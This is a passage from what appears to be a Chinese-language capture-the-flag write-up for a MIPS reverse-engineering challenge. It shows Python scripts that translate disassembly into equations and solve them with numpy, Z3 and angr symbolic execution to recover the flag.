class="line">            n2 = code[1].split(&quot;,&quot;)[1].strip()</span><br><span class="line">            code = (n1 + &quot; = &quot; + n1 + &quot;&lt;&lt;&quot; + n2)</span><br><span class="line">        elif(c==&quot;sra&quot;):</span><br><span class="line">            n1 = code[1].split(&quot;,&quot;)[0]</span><br><span class="line">            n2 = code[1].split(&quot;,&quot;)[1].strip()</span><br><span class="line">            code = (n1 + &quot; = &quot; + n1 + &quot;&gt;&gt;&quot; + n2)</span><br><span class="line">        elif(c==&quot;xori&quot;):</span><br><span class="line">            n1 = code[1].split(&quot;,&quot;)[0]</span><br><span class="line">            n2 = code[1].split(&quot;,&quot;)[1].strip()</span><br><span class="line">            code = (n1 + &quot; = &quot; + n1 + &quot;^&quot; + n2)</span><br><span class="line">        elif(c==&quot;addiu&quot;):</span><br><span class="line">            n1 = code[1].split(&quot;,&quot;)[0]</span><br><span class="line">            n2 = code[1].split(&quot;,&quot;)[1].strip()</span><br><span class="line">            code = (n1 + &quot; = &quot; + n1 + &quot;+&quot; + n2)</span><br><span class="line">            # print(&quot;+&quot;)</span><br><span class="line">        elif(c==&quot;mul&quot;):</span><br><span class="line">            n1 = code[1].split(&quot;,&quot;)[0]</span><br><span class="line">            n2 = code[2].split(&quot;,&quot;)[0].strip()</span><br><span class="line">            n3 = code[3].strip()</span><br><span class="line">            code = (n1 + &quot; = &quot; + n2 + &quot;*&quot; + n3)</span><br><span class="line">        elif(c==&quot;addu&quot;):</span><br><span class="line">            n1 = code[1].split(&quot;,&quot;)[0]</span><br><span class="line">            n2 = code[2].split(&quot;,&quot;)[0].strip()</span><br><span class="line">            code = (n1 + &quot; = &quot; + n1 + &quot;+&quot; + n2)</span><br><span class="line">            print(&quot;+&quot;)</span><br><span class="line">        elif(c==&quot;subu&quot;):</span><br><span class="line">            n1 = code[1].split(&quot;,&quot;)[0]</span><br><span class="line">            n2 = code[2].split(&quot;,&quot;)[0].strip()</span><br><span class="line">            code = (n1 + &quot; = &quot; + n1 + &quot;-&quot; + n2)</span><br><span class="line">            print(&quot;-&quot;)</span><br><span class="line">        elif(c==&quot;beq&quot;):</span><br><span class="line">            print(&quot;=0x%x&quot;%(v0))</span><br><span class="line">            print(&quot;================================================one function=====================================&quot;)</span><br><span class="line">            functions +=1</span><br><span class="line">            continue</span><br><span class="line">        elif(c==&quot;negu&quot;):</span><br><span class="line">            n1 = code[1].split(&quot;,&quot;)[0]</span><br><span class="line">            n2 = code[2].split(&quot;,&quot;)[0].strip()</span><br><span class="line">            code = (n1 + &quot; = &quot; + &quot;-&quot; + n2)</span><br><span class="line">            print(&quot;-&quot;)</span><br><span class="line">        elif(c==&quot;nop&quot;):</span><br><span class="line">            continue</span><br><span class="line">        elif(c==&quot;lui&quot;):</span><br><span class="line">            n1 = code[1].split(&quot;,&quot;)[0]</span><br><span class="line">            n2 = code[1].split(&quot;,&quot;)[1].strip()</span><br><span class="line">            code = (n1 + &quot; = &quot; + n2 + &quot;&lt;&lt;32&quot;)</span><br><span class="line">        elif(c==&quot;move&quot; or c==&quot;and&quot;):</span><br><span class="line">            continue</span><br><span class="line">        elif(c in flower):</span><br><span class="line">            # print(&quot;[f]:\t&quot; + &quot;&quot;.join(code)[:-1])</span><br><span class="line">            continue</span><br><span class="line"></span><br><span class="line">        else:</span><br><span class="line">            print(&quot;[x]:\tFind unknown code | &quot; + &quot;&quot;.join(code))</span><br><span class="line">            break</span><br><span class="line">        # print(&quot;[-]:\t&quot; + code)</span><br><span class="line">        exec(code)</span><br><span class="line">except Exception as e:</span><br><span class="line">    print(repr(e))</span><br><span class="line">    print(code)</span><br><span class="line">print(functions)</span><br><span class="line"># print(fp)</span><br></pre></td></tr></table></figure><h3 id="解方程"><a href="#解方程" class="headerlink" title="解方程"></a>解方程</h3><p>解方程的方法很多<br>比如Python的有</p><blockquote><p>Numpy 求解线性方程组<br>SciPy 求解非线性方程组<br>SymPy</p></blockquote><p>上面三个有个链接可以参照<a href="https://zhuanlan.zhihu.com/p/24893371" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/24893371</a></p><h4 id="numpy求解"><a href="#numpy求解" class="headerlink" title="numpy求解"></a>numpy求解</h4><p>来自‘niuwuwu’</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">from scipy.linalg import solve</span><br><span class="line">A=[</span><br><span class="line">    [-56251,64497,-61787,29993,-16853,2147,-51990,-36278,-34108,-1148,1798,-43452,-16150,-56087,-17677,-41752],</span><br><span class="line">    [-39354,63754,50513,2396,-37448,43585,19468,-4688,-62869,-20663,41173,61113,30862,38224,-601,53899],</span><br><span class="line">    [26798,-58888,14929,-21751,-12385,55961,-20714,24897,40045,9805,25147,39173,-21952,-42840,37937,-8559],</span><br><span class="line">    [-2789,53359,16747,54195,-30020,39916,-32582,60338,13971,27307,-30484,47826,37554,64914,-1745,27669],</span><br><span class="line">    [40374,6523,13380,-53413,-1194,7796,-31815,-51866,-40252,-56883,57811,23278,-5785,61525,-6984,-7335],</span><br><span class="line">    [-57052,-64573,-62351,2628,21493,12939,-60006,435,15009,-4091,22743,4901,48803,-43203,5263,-32994],</span><br><span class="line">    [54760,41053,22537,-56473,46316,19787,-40180,2088,2044,26575,-5207,31098,-23838,21642,46750,13706],</span><br><span class="line">    [-40176,-43382,48718,-25423,21452,-36714,-24119,-13231,-52192,49742,54709,-32636,20233,21460,48733,15155],</span><br><span class="line">    [38446,-880,-2443,50487,-46973,-56178,-37138,-9079,-19096,-60988,-1823,-21538,43896,-4141,-19370,-47796],</span><br><span class="line">    [5176,18400,-53852,36119,-32120,47724,17154,5390,-29717,14471,8755,1432,-45518,-8148,-56623,-48254],</span><br><span class="line">    [30203,-50712,-27560,-16075,3618,590,44305,20581,33442,-7743,-43075,-16234,45723,-44899,42321,49264],</span><br><span class="line">    [42705,-32299,-19156,5594,28870,8059,58103,-60723,-32112,-7128,45985,-24915,63910,18427,-51408,22619],</span><br><span class="line">    [-57517,20738,-32286,55995,26666,37550,-51489,13733,32455,-2897,-39622,-54523,50733,-24649,-17849,-62326],</span><br><span class="line">    [-15716,-38264,64476,-37524,-61551,13536,12920,1407,-63767,-55105,-46543,-36562,-20712,2063,-6668,9074],</span><br><span class="line">    [47490,18611,52416,3107,32177,-41780,11008,7223,5652,881,26719,-28444,46077,-272,-32475,-9432],</span><br><span class="line">    [-58938,-35689,35708,44689,45902,36614,38550,731,49990,6727,61526,-35587,-39199,-43886,-56409,-25519],</span><br><span class="line">]</span><br><span class="line">B=[-24232262,17175305,8705731,26962228,-6384428,-15459013,19554563,-188243,-19590071,-12754495,6442406,-2869966,-4805280,-18964176,8938201,3896470]</span><br><span class="line"></span><br><span class="line">a = np.array(A)</span><br><span class="line">b = np.array(B)</span><br><span class="line">x =solve(a,b)</span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure><hr><p>来自‘ljt1000’</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line"></span><br><span class="line">A  = &quot;-15858,-48466,32599,38605,-44159,23939,45662,9287,47754,47937,41896,51986,-26968,22561,30701,63487;&quot;</span><br><span class="line">A += &quot;60228,-3993,-16615,57134,-19246,-38581,40294,-44968,-28198,-58965,-39534,22458,-8828,48593,46135,23871;&quot;</span><br><span class="line">A += &quot;59121,42162,-65140,-3847,-23842,-47173,-39252,37804,-20964,-19217,56467,5112,9324,61729,61599,3578;&quot;</span><br><span class="line">A += &quot;-36731,-26147,1670,19245,26847,39911,8628,57946,-51207,63125,-21537,-9321,40745,-58129,30962,-27610;&quot;</span><br><span class="line">A += &quot;-63560,-53320,-34289,61060,-14289,46922,53218,36638,-61969,-33727,-4681,32423,-17044,-46689,-35443,-24156;&quot;</span><br><span class="line">A += &quot;-10571,-11103,51585,-24771,63730,57047,-63227,4227,-56470,-22654,-46325,62842,22480,59412,24937,62085;&quot;</span><br><span class="line">A += &quot;52617,-54333,61495,33704,-41733,-44527,51882,-61765,-24691,-10103,31055,61454,-59349,9812,-48848,-47279;&quot;</span><br><span class="line">A += &quot;-40696,-26470,54670,-23715,10008,7723,-62622,53112,31753,-5047,-48878,-58448,19875,-34944,-22161,35800;&quot;</span><br><span class="line">A += &quot;-23196,-43354,-58947,3384,-2426,-60194,51907,-20177,-31882,61703,42398,-4627,45749,-29203,-11139,-41301;&quot;</span><br><span class="line">A += &quot;-37819,-10066,-48579,-62613,-28961,40001,-37989,-27875,-20264,-33616,-5998,30740,-29594,21652,5165,51797;&quot;</span><br><span class="line">A += &quot;52993,62328,4196,-55719,-1917,28075,-44831,-15799,13652,-52110,-38933,62219,40030,-23815,-19505,60128;&quot;</span><br><span class="line">A += &quot;35796,-28033,-59250,46833,39767,-22909,5585,-42334,64787,6068,60536,-54554,22189,-49945,40846,64023;&quot;</span><br><span class="line">A += &quot;-18536,-35823,4253,-63956,20175,43158,30523,28298,-29564,18809,50821,-38574,3005,33408,58281,-29452;&quot;</span><br><span class="line">A += &quot;2848,39836,46250,24950,38512,31901,-21506,-36050,44162,41717,-36605,-26097,-38073,36024,7349,19105;&quot;</span><br><span class="line">A += &quot;22525,15747,63301,42436,-26106,-22761,48830,6176,-55225,-45599,-30368,50701,5775,10902,12758,-19336;&quot;</span><br><span class="line">A += &quot;-58450,-51156,-5460,32490,-26701,27355,34100,-14902,10736,54258,-9189,-25920,48339,-61339,61403,-30542&quot;</span><br><span class="line"></span><br><span class="line">b = &quot;23261386,-1298872,13877344,9172342,-11622989,10343966,-9721165,-8286458,-7515929,-12609498,2179053,11137244,12446496,10255605,854242,1542147&quot;</span><br><span class="line"></span><br><span class="line">A = np.mat(A)</span><br><span class="line">b = np.mat(b).T</span><br><span class="line">r = np.linalg.solve(A,b)</span><br><span class="line">print r</span><br></pre></td></tr></table></figure><h4 id="Z3约束器求解方程"><a href="#Z3约束器求解方程" class="headerlink" title="Z3约束器求解方程"></a>Z3约束器求解方程</h4><p>Z3可以说很出名了<br>这里有个教程<a href="http://ericpony.github.io/z3py-tutorial/guide-examples.htm" target="_blank" rel="noopener">http://ericpony.github.io/z3py-tutorial/guide-examples.htm</a></p><p>来自‘奈沙夜影’</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line"></span><br><span class="line">a = [BitVec(&quot;a%d&quot;%i, 32) for i in range(16)]</span><br><span class="line">s = Solver()</span><br><span class="line">s.add(0xca6a*a[0] -0xd9ee*a[1] +0xc5a7*a[2] +0x19ee*a[3] +0xb223*a[4] +0x42e4*a[5] +0xc112*a[6] -0xcf45*a[7] +0x260d*a[8] +0xd78d*a[9] +0x99cb*a[10] -0x3e58*a[11] -0x97cb*a[12] +0xfba9*a[13] -0xdc28*a[14] +0x859b*a[15]  == 0xaa2ed7)</span><br><span class="line">s.add(0xf47d*a[0] +0x12d3*a[1] -0x4102*a[2] +0xcedf*a[3] -0xafcf*a[4] -0xeb20*a[5] -0x2065*a[6] +0x36d2*a[7] -0x30fc*a[8] -0x7e5c*a[9] +0xeea8*a[10] +0xd8dd*a[11] -0xae2*a[12] +0xc053*a[13] +0x5158*a[14] -0x8d42*a[15]  == 0x69d32e)</span><br><span class="line">s.add(0xffff52cf*a[0] -0x4fea*a[1] +0x2075*a[2] +0x9941*a[3] -0xbd78*a[4] +0x9e58*a[5] +0x40ad*a[6] -0x8637*a[7] -0x2e08*a[8] +0x4414*a[9] +0x2748*a[10] +0x1773*a[11] +0xe414*a[12] -0x7b19*a[13] +0x6b71*a[14] -0x3dcf*a[15]  == 0x3b89d9)</span><br><span class="line">s.add(0xffffedd7*a[0] -0x1df0*a[1] +0x8115*a[2] +0x54bd*a[3] -0xf2ba*a[4] +0xdbd*a[5] +0x1dcf*a[6] +0x272*a[7] -0x2fcc*a[8] -0x93d8*a[9] -0x6f6c*a[10] -0x98ff*a[11] +0x2148*a[12] -0x6be2*a[13] +0x2e56*a[14] -0x7bdf*a[15]  == 0xff6a5aea)</span><br><span class="line">s.add(0xffffa8c1*a[0] +0xdc78*a[1] -0x380f*a[2] +0x33c0*a[3] -0x7252*a[4] -0xe5a9*a[5] +0x7a53*a[6] -0x4082*a[7] -0x584a*a[8] +0xc8db*a[9] +0xd941*a[10] +0x6806*a[11] -0x8b97*a[12] +0x23d4*a[13] +0xac2a*a[14] +0x20ad*a[15]  == 0x953584)</span><br><span class="line">s.add(0x5bb7*a[0] -0xfdb2*a[1] +0xaaa5*a[2] -0x50a2*a[3] -0xa318*a[4] +0xbcba*a[5] -0x5e5a*a[6] +0xf650*a[7] +0x4ab6*a[8] -0x7e3a*a[9] -0x660c*a[10] +0xaed9*a[11] -0xa60f*a[12] +0xf924*a[13] -0xff1d*a[14] +0xc888*a[15]  == 0xffd31341)</span><br><span class="line">s.add(0x812d*a[0] -0x402c*a[1] +0xaa99*a[2] -0x33b*a[3] +0x311b*a[4] -0xc0d1*a[5] -0xfad*a[6] -0xc1bf*a[7] -0x1560*a[8] -0x445b*a[9] -0x9b78*a[10] +0x3b94*a[11] +0x2531*a[12] -0xfb03*a[13] +0x8*a[14] +0x8721*a[15]  == 0xff9a6b57)</span><br><span class="line">s.add(0x15c5*a[0] +0xb128*a[1] -0x957d*a[2] +0xdf80*a[3] +0xee68*a[4] -0x3483*a[5] -0x4b39*a[6] -0x3807*a[7] -0x4f77*a[8] +0x652f*a[9] -0x686f*a[10] -0x7fc1*a[11] -0x5d2b*a[12] -0xb326*a[13] -0xacde*a[14] +0x1f11*a[15]  == 0xffd6b3d3)</span><br><span class="line">s.add(0xaf37*a[0] +0x709*a[1] +0x4a95*a[2] -0xa445*a[3] -0x4c32*a[4] -0x6e5c*a[5] -0x45a6*a[6] +0xb989*a[7] +0xf5b7*a[8] +0x3980*a[9] -0x151d*a[10] +0xaf13*a[11] +0xa134*a[12] +0x67ff*a[13] +0xce*a[14] +0x79cf*a[15]  == 0xc6ea77)</span><br><span class="line">s.add(0xffff262a*a[0] +0xdf05*a[1] -0x148e*a[2] -0x4758*a[3] -0xc6b2*a[4] -0x4f94*a[5] -0xf1f4*a[6] +0xcf8*a[7] +0xf5f1*a[8] -0x7883*a[9] -0xe2c6*a[10] -0x67*a[11] +0xeccc*a[12] -0xc630*a[13] -0xba2e*a[14] -0x6e41*a[15]  == 0xff1daae5)</span><br><span class="line">s.add(0xffff9be3*a[0] -0x716d*a[1] +0x4505*a[2] -0xb99d*a[3] +0x1f00*a[4] +0x72bc*a[5] -0x7ff*a[6] +0x8945*a[7] -0xcc33*a[8] -0xab8f*a[9] +0xde9e*a[10] -0x6b69*a[11] -0x6380*a[12] +0x8cee*a[13] -0x7a60*a[14] +0xbd39*a[15]  == 0xff5be0b4)</span><br><span class="line">s.add(0x245e*a[0] +0xf2c4*a[1] -0xeb20*a[2] -0x31d8*a[3] -0xe329*a[4] +0xa35a*a[5] +0xaacb*a[6] +0xe24d*a[7] +0xeb33*a[8] +0xcb45*a[9] -0xdf3a*a[10] +0x27a1*a[11] +0xb775*a[12] +0x713e*a[13] +0x5946*a[14] +0xac8e*a[15]  == 0x144313b)</span><br><span class="line">s.add(0x157*a[0] -0x5f9c*a[1] -0xf1e6*a[2] +0x550*a[3] -0x441b*a[4] +0x9648*a[5] +0x8a8f*a[6] +0x7d23*a[7] -0xe1b2*a[8] -0x5a46*a[9] -0x5461*a[10] +0xee5f*a[11] -0x47e6*a[12] +0xa1bf*a[13] +0x6cf0*a[14] -0x746b*a[15]  == 0xffd18bd2)</span><br><span class="line">s.add(0xf81b*a[0] -0x76cb*a[1] +0x543d*a[2] -0x4a85*a[3] +0x1468*a[4] +0xd95a*a[5] +0xfbb1*a[6] +0x6275*a[7] +0x30c4*a[8] -0x9595*a[9] -0xdbff*a[10] +0x1d1d*a[11] +0xb1cf*a[12] -0xa261*a[13] +0xf38e*a[14] +0x895c*a[15]  == 0xb5cb52)</span><br><span class="line">s.add(0xffff6b97*a[0] +0xd61d*a[1] +0xe843*a[2] -0x8c64*a[3] +0xda06*a[4] +0xc5ad*a[5] +0xd02a*a[6] -0x2168*a[7] +0xa89*a[8] +0x2dd*a[9] -0x80cc*a[10] -0x9340*a[11] -0x3f07*a[12] +0x4f74*a[13] +0xb834*a[14] +0x1819*a[15]  == 0xa6014d)</span><br><span class="line">s.add(0x48ed*a[0] +0x2141*a[1] +0x33ff*a[2] +0x85a9*a[3] -0x1c88*a[4] +0xa7e6*a[5] -0xde06*a[6] +0xbaf6*a[7] +0xc30f*a[8] -0xada6*a[9] -0xa114*a[10] -0x86e9*a[11] +0x70f9*a[12] +0x7580*a[13] -0x51f8*a[14] -0x492f*a[15]  == 0x2fde7c)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(s.check()==sat):</span><br><span class="line">    c = b&apos;&apos;</span><br><span class="line">    m = s.model()</span><br><span class="line">    for i in range(16):</span><br><span class="line">        print(&quot;a[%d]=%d&quot;%(i, m[a[i]].as_long()))</span><br><span class="line">    for i in range(16):</span><br><span class="line">        print(chr(m[a[i]].as_long()&amp;0xff), end=&apos;&apos;)</span><br></pre></td></tr></table></figure><hr><p>来自‘cq674350529’</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"></span><br><span class="line">from z3 import *</span><br><span class="line"></span><br><span class="line">a = [BitVec(&apos;a%d&apos; %i, 32) for i in xrange(16)]</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">s.add(0xffffc20e*a[0]-0xbd52*a[1]+0x7f57*a[2]+0x96cd*a[3]-0xac7f*a[4] +0x5d80*a[5]+0xb25e*a[6]+0x2447*a[7]+0xba8a*a[8]+0xbb41*a[9]+0xa3a8*a[10]+0xcb12*a[11]-0x6958*a[12]+0x5821*a[13]+0x77ed*a[14]+0xf7ff*a[15] == 0x162f0ca )</span><br><span class="line">s.add(0xeb44*a[0]-0x0f99*a[1] - 0x40e7*a[2] +0xdf2e*a[3] -0x4b2e*a[4] -0x96b5*a[5] +0x9d66*a[6] -0xafa8*a[7] -0x6e26*a[8] -0xe655*a[9]- 0x9a6e*a[10] +0x57ba*a[11] -0x227c*a[12] +0xbdd1*a[13] +0xb437*a[14] +0x5d3f*a[15]== 0xffec2e48)</span><br><span class="line">s.add(0xe6f1*a[0] +0xa4b2*a[1] -0xfe74*a[2] -0x0f07*a[3] -0x5d22*a[4] -0xb845*a[5] -0x9954*a[6] +0x93ac*a[7] -0x51e4*a[8] -0x4b11*a[9] +0xdc93*a[10] +0x13f8*a[11] +0x246c*a[12] +0xf121*a[13] +0xf09f*a[14] +0x0dfa*a[15] == 0xd3c060)</span><br><span class="line">s.add(0xffff7085*a[0] -0x6623*a[1] +0x0686*a[2] +0x4b2d*a[3] +0x68df*a[4] +0x9be7*a[5] +0x21b4*a[6] +0xe25a*a[7] -0xc807*a[8] +0xf695*a[9] -0x5421*a[10] -0x2469*a[11] +0x9f29*a[12] -0xe311*a[13] +0x78f2*a[14] -0x6bda*a[15] == 0x8bf576)</span><br><span class="line">s.add(0xffff07b8*a[0] -0xd048*a[1] -0x85f1*a[2] +0xee84*a[3] -0x37d1*a[4] +0xb74a*a[5] +0xcfe2*a[6]+ 0x8f1e*a[7] -0xf211*a[8] -0x83bf*a[9] -0x1249*a[10] +0x7ea7*a[11] -0x4294*a[12] -0xb661*a[13] -0x8a73*a[14] -0x5e5c*a[15] == 0xff4ea5b3)</span><br><span class="line">s.add(0xffffd6b5*a[0] -0x2b5f*a[1]+ 0xc981*a[2] -0x60c3*a[3] +0xf8f2*a[4]+ 0xded7*a[5]- 0xf6fb*a[6] +0x1083*a[7]- 0xdc96*a[8]- 0x587e*a[9] -0xb4f5*a[10] +0xf57a*a[11] +0x57d0*a[12] +0xe814*a[13] +0x6169*a[14] +0xf285*a[15] == 0x9dd61e)</span><br><span class="line">s.add(0xcd89*a[0] -0xd43d*a[1] +0xf037*a[2] +0x83a8*a[3] -0xa305*a[4] -0xadef*a[5] +0xcaaa*a[6] -0xf145*a[7]- 0x6073*a[8]- 0x2777*a[9] +0x794f*a[10] +0xf00e*a[11] -0xe7d5*a[12] +0x2654*a[13] -0xbed0*a[14] -0xb8af*a[15] == 0xff6baab3)</span><br><span class="line">s.add(0xffff6108*a[0] -0x6766*a[1] +0xd58e*a[2] -0x5ca3*a[3] +0x2718*a[4] +0x1e2b*a[5] -0xf49e*a[6] +0xcf78*a[7] +0x7c09*a[8] -0x13b7*a[9] -0xbeee*a[10]- 0xe450*a[11] +0x4da3*a[12] -0x8880*a[13] -0x5691*a[14] +0x8bd8*a[15] == 0xff818f06)</span><br><span class="line">s.add(0xffffa564*a[0] -0xa95a*a[1] -0xe643*a[2] +0x0d38*a[3] -0x097a*a[4] -0xeb22*a[5] +0xcac3*a[6] -0x4ed1*a[7] -0x7c8a*a[8] +0xf107*a[9] +0xa59e*a[10]- 0x1213*a[11] +0xb2b5*a[12] -0x7213*a[13] -0x2b83*a[14] -0xa155*a[15] == 0xff8d50e7)</span><br><span class="line">s.add(0xffff6c45*a[0] -0x2752*a[1] -0xbdc3*a[2] -0xf495*a[3] -0x7121*a[4] +0x9c41*a[5] -0x9465*a[6]- 0x6ce3*a[7] -0x4f28*a[8] -0x8350*a[9] -0x176e*a[10] +0x7814*a[11] -0x739a*a[12] +0x5494*a[13] +0x142d*a[14] +0xca55*a[15] == 0xff3f9826)</span><br><span class="line">s.add(0xcf01*a[0] +0xf378*a[1] +0x1064*a[2] -0xd9a7*a[3] -0x077d*a[4]+ 0x6dab*a[5] -0xaf1f*a[6]- 0x3db7*a[7] +0x3554*a[8] -0xcb8e*a[9] -0x9815*a[10]+ 0xf30b*a[11] +0x9c5e*a[12] -0x5d07*a[13] -0x4c31*a[14] +0xeae0*a[15] == 0x213fed)</span><br><span class="line">s.add(0x8bd4*a[0] -0x6d81*a[1] -0xe772*a[2] +0xb6f1*a[3] +0x9b57*a[4] -0x597d*a[5] +0x15d1*a[6]- 0xa55e*a[7]+ 0xfd13*a[8]+ 0x17b4*a[9] +0xec78*a[10] -0xd51a*a[11] +0x56ad*a[12] -0xc319*a[13] +0x9f8e*a[14] +0xfa17*a[15] == 0xa9f0dc)</span><br><span class="line">s.add(0xffffb798*a[0] -0x8bef*a[1] +0x109d*a[2]- 0xf9d4*a[3] +0x4ecf*a[4] +0xa896*a[5] +0x773b*a[6] +0x6e8a*a[7] -0x737c*a[8]+ 0x4979*a[9] +0xc685*a[10] -0x96ae*a[11] +0x0bbd*a[12] +0x8280*a[13] +0xe3a9*a[14] -0x730c*a[15] == 0xbdeb20)</span><br><span class="line">s.add(0x0b20*a[0] +0x9b9c*a[1] +0xb4aa*a[2]+ 0x6176*a[3] +0x9670*a[4] +0x7c9d*a[5] -0x5402*a[6] -0x8cd2*a[7] +0xac82*a[8] +0xa2f5*a[9] -0x8efd*a[10] -0x65f1*a[11] -0x94b9*a[12] +0x8cb8*a[13] +0x1cb5*a[14] +0x4aa1*a[15] == 0x9c7cf5)</span><br><span class="line">s.add(0x57fd*a[0] +0x3d83*a[1] +0xf745*a[2] +0xa5c4*a[3] -0x65fa*a[4] -0x58e9*a[5] +0xbebe*a[6] +0x1820*a[7] -0xd7b9*a[8] -0xb21f*a[9] -0x76a0*a[10] +0xc60d*a[11] +0x168f*a[12] +0x2a96*a[13] +0x31d6*a[14] -0x4b88*a[15] == 0xd08e2)</span><br><span class="line">s.add(0xffff1bae*a[0] -0xc7d4*a[1] -0x1554*a[2] +0x7eea*a[3] -0x684d*a[4] +0x6adb*a[5] +0x8534*a[6] -0x3a36*a[7] +0x29f0*a[8] +0xd3f2*a[9] -0x23e5*a[10] -0x6540*a[11] +0xbcd3*a[12] -0xef9b*a[13] +0xefdb*a[14] -0x774e*a[15] == 0x178803)</span><br><span class="line"></span><br><span class="line">for item in a:</span><br><span class="line">    s.add(item &gt; 0, item &lt; 127)</span><br><span class="line"></span><br><span class="line">if s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    flag = []</span><br><span class="line">    for i in xrange(16):</span><br><span class="line">        flag.append(m[a[i]].as_long())</span><br><span class="line">    print &apos;&apos;.join(map(chr, flag))</span><br></pre></td></tr></table></figure><h3 id="angr二进制自动化分析及符号执行"><a href="#angr二进制自动化分析及符号执行" class="headerlink" title="angr二进制自动化分析及符号执行"></a>angr二进制自动化分析及符号执行</h3><p>angr是一个基于python的二进制漏洞分析框架，集成了多种主流的分析技术，能够进行动态的符号执行分析和多种静态分析。</p><p>如果我们使用angr的话，就不再需要考虑算法内部的详细原理，利用符号执行可以大大减少分析时间</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:00403620                 lw      $gp, 0x98+var_50($fp)</span><br><span class="line">.text:00403624                 addiu   $v0, $fp, 0x98+var_48</span><br><span class="line">.text:00403628                 move    $a0, $v0</span><br><span class="line">.text:0040362C                 jal     sub_400420</span><br><span class="line">.text:00403630                 nop</span><br><span class="line">.text:00403634                 lw      $gp, 0x98+var_50($fp)</span><br><span class="line">.text:00403638                 beqz    $v0, loc_4036E4</span><br><span class="line">.text:0040363C                 nop</span><br></pre></td></tr></table></figure><p>通过静态分析可知，程序在0x40362c处调用sub_400420函数，其参数通过寄存器a0传递，然后返回值保存在v0寄存器中。之后对v0的内容进行判断，如果为1则输出flag(flag与用户输入的内容相关)，为0则输出”Wrong”。因此，只需要求解输入，保证sub_400420的返回值为1即可。</p><p>angr脚本<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"></span><br><span class="line">import angr</span><br><span class="line"></span><br><span class="line">project = angr.Project(&apos;./patch&apos;, load_options=&#123;&apos;auto_load_libs&apos;:False&#125;)</span><br><span class="line"></span><br><span class="line">start_address = 0x400420</span><br><span class="line">memory_address = 0x10000000</span><br><span class="line"></span><br><span class="line">find_address = 0x4031F0</span><br><span class="line">avoid_address = (0x4019E4, 0x401b7c,0x401D18, 0x401EB0, 0x40204C, 0x4021E4, 0x40237C, 0x402518, 0x4026B4, 0x40284C, 0x4029E4, 0x402B7C, 0x402D14, 0x402EB0, 0x403048, 0x4031E0)</span><br><span class="line"></span><br><span class="line">state = project.factory.blank_state(addr=start_address)</span><br><span class="line"></span><br><span class="line">for i in xrange(16):</span><br><span class="line">    state.memory.store(memory_address+i*4, state.solver.BVS(&apos;a%d&apos; % i, 32), endness=state.arch.memory_endness)</span><br><span class="line"></span><br><span class="line">state.regs.a0 = memory_address</span><br><span class="line"></span><br><span class="line"># add LAZY_SOLVES to speed up</span><br><span class="line">simgr = project.factory.simulation_manager(state, add_options=&#123;angr.options.LAZY_SOLVES&#125;)</span><br><span class="line"></span><br><span class="line">simgr.explore(find=find_address, avoid=avoid_address)</span><br><span class="line"></span><br><span class="line">if simgr.found:</span><br><span class="line">    find_state = simgr.found[0]</span><br><span class="line"></span><br><span class="line">    # add constraints to reduce the keyspace</span><br><span class="line">    for i in xrange(16):</span><br><span class="line">        value = find_state.memory.load(memory_address+i*4,4, endness=find_state.arch.memory_endness)</span><br><span class="line">        find_state.add_constraints(value &gt; 0, value &lt; 127)</span><br><span class="line"></span><br><span class="line">    flag = [find_state.se.eval(find_state.memory.load(memory_address+i*4, 4, endness=find_state.arch.memory_endness)) for i in xrange(16)]</span><br><span class="line">    print &apos;&apos;.join(map(chr,flag))</span><br></pre></td></tr></table></figure></p><p>返回1的地址<br><img src="https://i.loli.net/2018/07/16/5b4c618f5dc80.jpg" alt="mark"></p><p><img src="https://i.loli.net/2018/07/16/5b4c6199a3626.jpg" alt="mark"><br>find_address是使得函数sub_400420返回值为1的地址，而avoid_address是使得函数sub_400420返回值为0的地址。同时，将输入的16个数字保存在内存地址0x10000000处，然后将其赋值给a0寄存器，实现参数的传递。之后，直接从函数sub_400420的开始处开始分析。</p><hr><p>第二种</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">from angr import *</span><br><span class="line">import logging</span><br><span class="line">import IPython</span><br><span class="line">logging.getLogger(&apos;angr.manager&apos;).setLevel(logging.DEBUG)</span><br><span class="line">p = Project(&apos;baby_mips&apos;)</span><br><span class="line">state = p.factory.blank_state(addr=0x400420)</span><br><span class="line">DATA_ADDR = 0xA0000</span><br><span class="line">state.regs.a0 = DATA_ADDR</span><br><span class="line">for i in range(16*4):</span><br><span class="line">    vec = state.solver.BVS(&quot;c&#123;&#125;&quot;.format(i),8,explicit_name=True)</span><br><span class="line">    cond = state.solver.And(vec&gt;=32,vec&lt;=126) # low byte</span><br><span class="line">    state.memory.store(DATA_ADDR+i,vec)</span><br><span class="line">    if i % 4 == 0:</span><br><span class="line">        pass</span><br><span class="line">    #state.add_constraints(cond)</span><br><span class="line">sm = p.factory.simulation_manager(state)</span><br><span class="line">res = sm.explore(find=0x4031F0,avoid=[0x4019E4, 0x401b7c,0x401D18, 0x401EB0, 0x40204C, 0x4021E4, 0x40237C, 0x402518, 0x4026B4, 0x40284C, 0x4029E4, 0x402B7C, 0x402D14, 0x402EB0, 0x403048, 0x4031E0])</span><br><span class="line"></span><br><span class="line">found = res.found[0]</span><br><span class="line">mem = found.memory.load(DATA_ADDR,16*4)</span><br><span class="line">print found.solver.eval(mem)</span><br><span class="line">print &apos;##########################################&apos;</span><br><span class="line">flag = &apos;&apos;</span><br><span class="line">for i in range(16):</span><br><span class="line">    v = found.memory.load(DATA_ADDR + 4*i,1)</span><br><span class="line">    flag = flag + found.solver.eval(v,cast_to=str)</span><br><span class="line">print flag  #7fe2c58fc9a7eb90</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/07/16/5b4c6199c866b.jpg" alt="mark"></p><p>flag每个人都是不一样的，我的用angr解的话，最后得到的是7fe2c58fc9a7eb90</p><h3 id="Flag"><a 